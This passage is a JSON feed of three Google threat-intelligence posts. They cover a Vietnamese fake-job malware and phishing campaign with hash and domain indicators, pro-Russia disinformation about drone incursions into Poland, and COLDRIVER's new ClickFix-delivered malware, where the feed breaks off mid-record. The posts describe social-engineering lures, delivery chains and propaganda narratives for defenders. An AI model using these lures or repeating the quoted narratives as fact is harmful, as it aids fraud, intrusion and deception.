{"source": "Threat Intelligence", "title": "Help Wanted: Vietnamese Actors Using Fake Job Posting Campaigns to Deliver Malware and Steal Credentials", "link": "https://cloud.google.com/blog/topics/threat-intelligence/vietnamese-actors-fake-job-posting-campaigns/", "published": "Thu, 23 Oct 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) is tracking a cluster of financially motivated threat actors operating from Vietnam that leverages fake job postings on legitimate platforms to target individuals in the digital advertising and marketing sectors. The actor effectively uses social engineering to deliver malware and phishing kits, ultimately aiming to compromise high-value corporate accounts, in order to hijack digital advertising accounts. GTIG tracks parts of this activity as UNC6229. </span></p>\n<p><span style=\"vertical-align: baseline;\">The activity targets remote digital advertising workers who have contract or part-time positions and may actively look for work while they currently have a job. The attack starts when a target downloads and executes malware or enters credentials into a phishing site. If the target falls victim while logged into a work computer with a personal account, or while using a personal device with access to company ads accounts, threat actors can gain access to those company accounts. <span style=\"vertical-align: baseline;\">Successful compromise of a corporate advertising or social media account allows the threat actor to either sell ads to other actors, or sell the accounts themselves to other actors to monetize, as they see fit. </span><span style=\"vertical-align: baseline;\">This blog describes the actor's tactics, techniques, and procedures (TTPs).</span></span></p>\n<p><span style=\"vertical-align: baseline;\">As part of our efforts to combat serious threat actors, GTIG uses the results of our research to improve the safety and security of Google’s products and users. Upon discovery, all identified websites, domains and files are added to the </span><a href=\"https://safebrowsing.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Safe Browsing</span></a><span style=\"vertical-align: baseline;\"> blocklist in order to protect web users across major browsers. We are committed to sharing our findings with the security community to raise awareness and to disrupt this activity. We hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Introduction</span></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG identified a persistent and targeted social engineering campaign operated by UNC6229, a financially motivated threat cluster assessed to be operating from Vietnam. This campaign exploits the trust inherent in the job application process by posting fake career opportunities on popular employment platforms, as well as freelance marketplaces and their own job posting websites. Applicants are lured into a multi-stage process that culminates in the delivery of either malware <span style=\"vertical-align: baseline;\">that allows remote access to the system</span> or highly convincing phishing pages designed to harvest corporate credentials.</span></p>\n<p><span style=\"vertical-align: baseline;\">The primary targets appear to be individuals working in digital marketing and advertising. By targeting this demographic, UNC6229 increases its chances of compromising individuals who have legitimate access to high-value corporate advertising and social media accounts. The campaign is notable for its patient, victim-initiated social engineering, abuse of legitimate commercial software, and its targeted approach to specific industries.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Campaign Overview: The \"Fake Career\" Lure</span></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"campaign overview\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/ads-targeting-overview.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Attack flow</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The effectiveness of this campaign hinges on a classic social engineering tactic where the victim initiates the first contact. UNC6229 creates fake company profiles, often masquerading as digital media agencies, on legitimate job platforms. They post attractive, often remote, job openings that appeal to their target demographic. </span></p>\n<p><span style=\"vertical-align: baseline;\">When an individual applies for one of these fake positions, they provide the actor with their name, contact information, and resume. This self-initiated action establishes a foundation of trust. When UNC6229 later contacts the applicant, the victim is more receptive, believing it to be a legitimate follow-up from a potential employer.</span></p>\n<p><span style=\"vertical-align: baseline;\">The vulnerability extends beyond the initial job application. The actor can retain the victim's information for future \"cold emails\" about other fabricated job opportunities or even sell the curated list of active job seekers to other attackers for similar abuse<span style=\"vertical-align: baseline;\">.</span></span></p>\n<h3><span style=\"vertical-align: baseline;\">Technical Analysis: The Attack Chain</span></h3>\n<p><span style=\"vertical-align: baseline;\">Once a victim applies to a job posting, UNC6229 initiates contact, typically via email, but also through direct messaging platforms. In some cases the attackers also use commercial CRM tools that allow sending bulk emails. Depending on the campaign the attacker may send the victim an attachment with malware, a link to a website that hosts malware,  or a link to a phishing page to schedule an interview.</span></p>\n<h4><strong><span style=\"vertical-align: baseline;\">1. Fake Job Posting</span></strong></h4>\n<p><span style=\"vertical-align: baseline;\">Using fake job postings the attackers target specific industries and locations, posting jobs relevant to the digital advertising industry in specific regions. This same kind of targeting would work across any industry or geographic location. The job postings are both on legitimate sites, as well as on websites created by the threat actors.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Screenshots of threat actors posting on LinkedIn\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/ads-targeting-fig1.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Screenshots of threat actors posting on LinkedIn</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Attackers have set up their own fake job posting websites\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/ads-targeting-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Attackers have set up their own fake job posting websites such as staffvirtual[.]website</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">2. Initial Contact and Infrastructure Abuse</span></h4>\n<p><span style=\"vertical-align: baseline;\">Once a victim applies to a job posting, UNC6229 initiates contact, typically via email, but also through direct messaging platforms. The initial contact is often benign and personalized, referencing the job the victim applied for and addressing the victim by name. This first contact typically does not contain any attachments or links, but is designed to elicit a response and further build rapport. </span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG has observed UNC6229 and other threat actors abusing a wide range of legitimate business and customer relationship management (CRM) platforms to send these initial emails and manage their campaigns. By abusing these trusted services, the actor's emails are more likely to bypass security filters and appear legitimate to the victim. We’ve shared insights about these campaigns with CRMs UNC6229 has abused, including Salesforce, to better secure the ecosystem. We continue to disrupt these actors by blocking their use of Google products, including Google Groups and Google AppSheet.</span></p>\n<h4><span style=\"vertical-align: baseline;\">3. Payload Delivery: Malware or Phishing</span></h4>\n<p><span style=\"vertical-align: baseline;\">After the victim responds, the actor proceeds to the payload delivery phase. Depending on the campaign the attacker may send the victim an attachment with malware or a link to a phishing page:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Malware Delivery:</strong><span style=\"vertical-align: baseline;\"> The actor sends an attachment, often a password-protected ZIP file, claiming it is a skills test, an application form, or a required preliminary task. The victim is instructed that opening the file is a mandatory step in the hiring process. The payload often includes remote access trojans (RATs) that allow the actor to gain full control of the victim's device and subsequently take over their online accounts.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Phishing Link: </strong><span style=\"vertical-align: baseline;\">The actor sends a link, sometimes obfuscated with a URL shortener, directing the victim to a phishing page. This page is often presented as a portal to schedule an interview or complete an assessment.</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The phishing pages are designed to be highly convincing, using the branding of major corporations. GTIG has analyzed multiple phishing kits <span style=\"vertical-align: baseline;\">associated with this threat activity</span> and found that they are often configured to specifically target corporate email credentials and can handle various multi-factor authentication (MFA) schemes, including those from Okta and Microsoft.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Attribution</span></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG assesses with high confidence that this activity is conducted by a cluster of financially motivated individuals located in Vietnam. The shared TTPs and infrastructure across multiple incidents suggest a collaborative environment where actors likely exchange tools and successful techniques on private forums.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Outlook</span></h3>\n<p><span style=\"vertical-align: baseline;\">The \"fake career\" social engineering tactic is a potent threat because it preys on fundamental human behaviors and the necessities of professional life. We expect UNC6229 and other actors to continue refining this approach, expanding their targeting to other industries where employees have access to valuable corporate assets. The abuse of legitimate SaaS and CRM platforms for malicious campaigns is a growing trend that challenges traditional detection methods.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Indicators of Compromise</span></h3>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The following indicators of compromise are available to registered users in a </span><a href=\"https://www.virustotal.com/gui/collection/4d48835758afa6048c6c277c1379f8999aeaa262f4c002cda7ef1f84ecc40763\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Threat Intelligence (GTI) collection</span></a>.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code style=\"vertical-align: baseline;\">staffvirtual[.]website</code></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><code style=\"vertical-align: baseline;\">137a6e6f09cb38905ff5c4ffe4b8967a45313d93bf19e03f8abe8238d589fb42</code></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><code style=\"vertical-align: baseline;\">33fc67b0daaffd81493818df4d58112def65138143cec9bd385ef164bb4ac8ab</code></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><code style=\"vertical-align: baseline;\">35721350cf3810dd25e12b7ae2be3b11a4e079380bbbb8ca24689fb609929255</code></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><code style=\"vertical-align: baseline;\">bc114aeaaa069e584da0a2b50c5ed6c36232a0058c9a4c2d7660e3c028359d81</code></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><code style=\"vertical-align: baseline;\">e1ea0b557c3bda5c1332009628f37299766ac5886dda9aaf6bc902145c41fd10</code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>"}
{"source": "Threat Intelligence", "title": "Pro-Russia Information Operations Leverage Russian Drone Incursions into Polish Airspace", "link": "https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions/", "published": "Tue, 21 Oct 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Alden Wahlstrom, David Mainor</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Introduction </span></h3>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) observed multiple instances of pro-Russia information operations (IO) actors promoting narratives related to the </span><a href=\"https://www.bbc.com/news/articles/c147065pzdzo\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reported incursion</span></a><span style=\"vertical-align: baseline;\"> of Russian drones into Polish airspace that occurred on Sept. 9-10, 2025. The identified IO activity, which mobilized in response to this event and the ensuing political and security developments, appeared consistent with previously observed instances of pro-Russia IO targeting Poland—and more broadly the NATO Alliance and the West. Information provided in this report was derived from GTIG's tracking of IO beyond Google surfaces. Google is committed to information transparency, and we will continue tracking these threats and blocking their inauthentic content on Google’s platforms. We regularly disclose our latest enforcement actions in the </span><a href=\"https://blog.google/threat-analysis-group/tag-bulletin-q2-2025/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TAG Bulletin</span></a>.</p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Observed messaging surrounding the Russian drone incursion into Polish airspace advanced multiple, often intersecting, influence objectives aligned with historic pro-Russia IO threat activity</span>:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Promoting a Positive Russian Image</strong><span style=\"vertical-align: baseline;\">: Concerted efforts to amplify messaging denying Russia’s culpability for the incursion. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Blaming NATO and the West</strong><span style=\"vertical-align: baseline;\">: The reframing of the events to serve Russian strategic interests, effectively accusing either Poland or NATO of manufacturing pretext to serve their own political agendas. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Undermining Domestic Confidence in Polish Government</strong><span style=\"vertical-align: baseline;\">: Messaging designed to negatively influence Polish domestic support for its own government, by insinuating that its actions related to both the event itself and the broader conflict in Ukraine are detrimental to Poland’s domestic stability.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Undermining International Support to Ukraine</strong><span style=\"vertical-align: baseline;\">: Messaging designed to undercut Polish domestic support for its government’s foreign policy position towards Ukraine.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Notably, Russia-aligned influence activities have long prioritized Poland, frequently leveraging a combination of Poland-focused operations targeting the country domestically, as well as operations that have promoted Poland-related narratives more broadly to global audiences. However, the mobilization of covert assets within Russia’s propaganda and disinformation ecosystem in response to this most recent event is demonstrative of how established pro-Russia influence infrastructure—including both long-standing influence campaigns and those which more recently emerged in response to Russia’s full-scale invasion of Ukraine in 2022—can be flexibly leveraged by operators to rapidly respond to high-profile, emerging geopolitical stressors. </span></p>\n<p><span style=\"vertical-align: baseline;\">Examples highlighted in this report are designed to provide a representative snapshot of pro-Russia influence activities surrounding the Russian drone incursion into Polish airspace; it is not intended to be a comprehensive account of all pro-Russia activity which may have leveraged these events.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Multiple Pro-Russia Campaigns Leveraged Drone Incursion Narratives</span></h3>\n<p><span style=\"vertical-align: baseline;\">Multiple IO actors that GTIG tracks rapidly promoted related narratives in the period immediately following the drone incursion. While this by itself is not evidence of coordination across these groups, it does highlight how influence actors throughout the pro-Russia ecosystem have honed their activity to be responsive to major geopolitical developments. This blog post contains examples that we initially observed as part of this activity.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Portal Kombat </span></h4>\n<p><span style=\"vertical-align: baseline;\">The actor publicly referred to as Portal Kombat (aka the “Pravda Network”) has been </span><a href=\"https://www.sgdsn.gouv.fr/files/files/20240212_NP_SGDSN_VIGINUM_PORTAL-KOMBAT-NETWORK_ENG_VF.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">publicly reported</span></a><span style=\"vertical-align: baseline;\"> on since at least 2024 as operating a network of domains that act as amplifiers of content seeded within the broader pro-Russia ecosystem, primarily focused on Russia's invasion of Ukraine. These domains share near identical characteristics while each targeting different geographic regions. As has likewise been documented in </span><a href=\"https://dfrlab.org/2025/02/24/russia-pravda-network-expands-worldwide/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public reporting</span></a><span style=\"vertical-align: baseline;\">, over time Portal Kombat has developed new infrastructure to expand its targeting of the West and other countries around the world via subdomains stemming from a single actor-controlled domain. Some examples of Portal Kombat’s promoted narratives related to the incursion of Russian drones into Polish airspace include the following:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">One article, ostensibly reporting on the crash of one of the drones, called into question whether the drones could have come from Russia, noting that the type of drones purportedly involved are not capable of reaching Poland.</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Another article claimed that officials from Poland and the Baltic States politicized the issue, intentionally reframing it as a threat to NATO as a means to derail possible Russia-U.S. negotiations regarding the conflict in Ukraine out of a fear that the U.S. would deprioritize the region to focus on China. The article further claimed that videos of the drones shown in the Polish media are fake, and that the Russian military does not have a real intention of attacking Poland.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A separate article promoted a purported statement made by a Ukrainian military expert, claiming that the result of the drone incursion was that Europe will focus its spending on defense at home, rather than on support for Ukraine—the purported statement speculated as to whether this was the intention of the incursion itself.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"English-language article published by the Portal Kombat domain network\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/russia-drone-io-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Example of an English-language article published by the Portal Kombat domain network, which promoted a narrative alleging that Polish and Baltic State officials were using news of the Russian drone incursion to derail U.S.-Russia negotiations related to the war in Ukraine</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Doppelganger</span></h4>\n<p><span style=\"vertical-align: baseline;\">The \"Doppelganger\" pro-Russia IO actor has created a network of inauthentic custom media brands that it leverages to target Europe, the U.S., and elsewhere. These websites often have a specific topical and regional focus and publish content in the language of the target audience. GTIG identified at least two instances in which Polish-language and German-language inauthentic custom media brands that we track disseminated content that leveraged the drone incident (Figure 2). </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A Polish-language article published to the domain of the Doppelganger custom media brand “Polski Kompas” promoted a narrative that leveraged the drone incursions as a means to claim that the Polish people do not support the government’s Ukraine policy. The article claimed that such support not only places a burden on Poland’s budget, but also risks the security and safety of the Polish people. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A German-language article published to the domain of the Doppelganger custom media brand “Deutsche Intelligenz” claimed that the European reaction to the drone incident was hyperinflated by officials as part of an effort to intimidate Europeans into entering conflict with Russia. The article claimed that Russia provided warning about the drones, underscoring that they were not threatening, and that NATO used this as pretext to increase its regional presence—steps that the article claimed pose a risk to Russia’s security and could lead to war.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Examples of articles published to the domains of two Doppelganger inauthentic media brands\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/russia-drone-io-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Examples of articles published to the domains of two Doppelganger inauthentic media brands: Polski Kompas (left) and Deutsche Intelligenz (right)</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Niezależny Dziennik Polityczny (NDP)</span></h4>\n<p><span style=\"vertical-align: baseline;\">The online publication \"Niezależny Dziennik Polityczny\" is a self-proclaimed \"independent political journal\" focused on Polish domestic politics and foreign policy and is the primary dissemination vector leveraged by the eponymously named long-standing, pro-Russia influence campaign, which GTIG refers to as \"NDP\". The publication has historically leveraged a number of suspected inauthentic personas as editors or contributing authors, most of whom have previously maintained accounts across multiple Western social media platforms and Polish-language blogging sites. NDP has been characterized by multiple sources as a prolific purveyor of primarily anti-NATO disinformation and has </span><a href=\"https://vsquare.org/russia-related-accounts-and-a-cyberattack-in-poland/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">recently</span></a><span style=\"vertical-align: baseline;\"> been a significant amplifier within the Polish information space of pro-Russia disinformation surrounding Russia's ongoing invasion of Ukraine.</span></p>\n<p><span style=\"vertical-align: baseline;\">Examples of NDP promoted narratives related to the incursion of Russian drones into Polish airspace:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">GTIG observed an article published under the name of a previously attributed NDP persona, which referenced the recent Polish response to the Russian drone incursion as a component of ongoing “war hysteria” artificially constructed to distract the Polish people from domestic issues. The article further framed other NATO activity in the region as disproportionate and potentially destabilizing (Figure 3). </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Additionally, GTIG observed content promoted by NDP branded social media assets that referenced the drone incursion in the days following these events. This included posts that alleged that Poland had been pre-warned about the drones, that Polish leadership was cynically and disproportionately responding to the incident, and that a majority of Poles blame Ukraine, NATO, or the Polish Government for the incident.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Examples of narratives related to the Russian drone incursion into Polish airspace\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/russia-drone-io-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Examples of narratives related to the Russian drone incursion into Polish airspace promoted by the NDP campaign’s “political journal” (left) and branded social media asset (right)</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Outlook</span></h3>\n<p><span style=\"vertical-align: baseline;\">Covert information operations and the spread of disinformation are increasingly key components of Russian state-aligned actors' efforts to advance their interests in the context of conflict. Enabled by an established online ecosystem, these actors seek to manipulate audiences to achieve ends like the exaggeration of kinetic military action’s efficacy and the incitement of fear, uncertainty, and doubt within vulnerable populations. The use of covert influence tactics in these instances is manifold: at minimum, it undermines society’s ability to establish a fact-based understanding of potential threats in real-time by diluting the information environment with noise; in tandem, it is also used to both shape realities on the ground and project messaging strategically aligned with one’s interests—both domestically and to international audiences abroad. </span></p>\n<p><span style=\"vertical-align: baseline;\">While the aforementioned observations highlight tactics leveraged by specifically Russia-aligned threat actors within the context of recent Russian drone incursions into Polish airspace, these observations are largely consistent with historical expectations of various ideologically-aligned </span><a href=\"https://blog.google/technology/safety-security/tool-of-first-resort-israel-hamas-war-in-cyber/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">threat actors</span></a><span style=\"vertical-align: baseline;\"> tracked by GTIG and their respective efforts to saturate target information environments </span><a href=\"https://blog.google/threat-analysis-group/fog-of-war-how-the-ukraine-conflict-transformed-the-cyber-threat-landscape/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">during wartime</span></a><span style=\"vertical-align: baseline;\">. Understanding both how and why malicious threat actors exploit high-profile, and often emerging, geopolitical stressors to further their political objectives is critical in identifying both how the threats themselves manifest and how to mitigate their potential impact. Separately, we note that the recent mobilization of covert assets within Russia’s propaganda and disinformation ecosystem in response to Russia’s drone incursion into Polish airspace is yet another data point suggesting Poland—and NATO allied countries, more broadly—will remain a high priority target of Russia-aligned influence activities.</span></p></div>"}
{"source": "Threat Intelligence", "title": "To Be (A Robot) or Not to Be: New Malware Attributed to Russia State-Sponsored COLDRIVER", "link": "https://cloud.google.com/blog/topics/threat-intelligence/new-malware-russia-coldriver/", "published": "Mon, 20 Oct 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Wesley Shields</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Introduction</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">COLDRIVER, a Russian state-sponsored threat group known for targeting high profile individuals in NGOs, policy advisors and dissidents, swiftly shifted operations after the May 2025 </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/coldriver-steal-documents-western-targets-ngos\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public disclosure</span></a><span style=\"vertical-align: baseline;\"> of its LOSTKEYS malware, operationalizing new malware families five days later. It is unclear how long COLDRIVER had this malware in development, but GTIG has not observed a single instance of LOSTKEYS since publication. Instead, GTIG has seen new malware used more aggressively than any other previous malware campaigns we have attributed to COLDRIVER (also known as UNC4057, Star Blizzard, and Callisto).</span></p>\n<p><span style=\"vertical-align: baseline;\">The new malware, which GTIG attributes directly to COLDRIVER, has undergone multiple iterations since discovery, indicating a rapidly increased development and operations tempo from COLDRIVER. It is a collection of related malware families connected via a delivery chain. GTIG seeks to build on details on a part of this infection chain released in a recent </span><a href=\"https://www.zscaler.com/blogs/security-research/coldriver-updates-arsenal-baitswitch-and-simplefix\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Zscaler blog post</span></a><span style=\"vertical-align: baseline;\"> by sharing wider details on the infection chain and related malware.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Malware Development Overview</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">This re-tooling began with a new malicious DLL called NOROBOT delivered via an updated COLDCOPY “ClickFix” lure that pretends to be a custom CAPTCHA. This is similar to previous LOSTKEYS deployment by COLDRIVER, but updates the infection by leveraging the user to execute the malicious DLL via rundll32, instead of the older multi-stage PowerShell method.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"malware development overview\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/coldriver-new-malware-fig1.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Malware development overview</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">While the earliest version of NOROBOT led to the deployment of a cumbersome Python backdoor tracked as YESROBOT, COLDRIVER quickly abandoned YESROBOT for a more flexible and extensible Powershell backdoor we track as MAYBEROBOT.</span></p>\n<p><span style=\"vertical-align: baseline;\">NOROBOT and its preceding infection chain have been subject to constant evolution—initially simplified to increase chances of successful deployment, before re-introducing complexity by splitting cryptography keys. The shift back to more complex delivery chains increases the difficulty of tracking their campaigns. This constant development highlights the group's efforts to evade detection systems for their delivery mechanism for continued intelligence collection against high-value targets.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Delivery via “ClickFix” and Rundll32</span></h3>\n<p><span style=\"vertical-align: baseline;\">This new malware infection chain contains three distinct components which are delivered via a new variant of the COLDCOPY “ClickFix” lure (</span><code style=\"vertical-align: baseline;\">c4d0fba5aaafa40aef6836ed1414ae3eadc390e1969fdcb3b73c60fe7fb37897</code><span style=\"vertical-align: baseline;\">) previously seen delivering LOSTKEYS. The new variant of COLDCOPY tries to get the user to download and execute a DLL using rundll32, while trying to disguise itself as a captcha by including text to verify that the user is not a robot. The DLL first observed was named “iamnotarobot.dll” and the export was named “humanCheck” - both of which play into the CAPTCHA theme of the page and partially inspired the ROBOT-themed naming convention for the malware that follows.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"COLDCOPY attempting to lure the user to execute NOROBOT\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/coldriver-new-malware-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: COLDCOPY attempting to lure the user to execute NOROBOT</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">NOROBOT</span></h3>\n<p><span 